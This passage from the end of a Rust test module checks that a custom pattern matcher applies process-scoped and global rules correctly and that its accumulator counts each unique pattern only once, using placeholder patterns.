            target_process: Some("svchost".to_string()),
        }];
        let matcher_scoped = CustomMatcher::build(&scoped_only).expect("matcher scoped");
        assert!(!matcher_scoped.has_rules_for_process(None));
        assert!(matcher_scoped.has_rules_for_process(Some("svchost")));
        assert!(!matcher_scoped.has_rules_for_process(Some("explorer")));

        let mixed = vec![
            CustomRule {
                client: "rule_scoped".to_string(),
                patterns: vec!["abc".to_string()],
                min_hits: 1,
                source: "scoped.txt".to_string(),
                target_process: Some("svchost".to_string()),
            },
            CustomRule {
                client: "rule_global".to_string(),
                patterns: vec!["xyz".to_string()],
                min_hits: 1,
                source: "global.txt".to_string(),
                target_process: None,
            },
        ];
        let matcher_mixed = CustomMatcher::build(&mixed).expect("matcher mixed");
        assert!(matcher_mixed.has_rules_for_process(None));
        assert!(matcher_mixed.has_rules_for_process(Some("anyproc")));
    }

    #[test]
    fn custom_accumulator_counts_unique_patterns_only() {
        let rules = vec![CustomRule {
            client: "rule_global".to_string(),
            patterns: vec!["alpha".to_string(), "beta".to_string()],
            min_hits: 2,
            source: "global.txt".to_string(),
            target_process: None,
        }];
        let matcher = CustomMatcher::build(&rules).expect("matcher");
        let mut acc = CustomAccumulator::new(&matcher, None);

        acc.feed_text("alpha alpha alpha");
        assert!(!acc.is_done());
        acc.feed_text("beta");
        assert!(acc.is_done());

        let hits = acc.finish();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].matched_count, 2);
        assert_eq!(hits[0].min_hits, 2);
    }
}
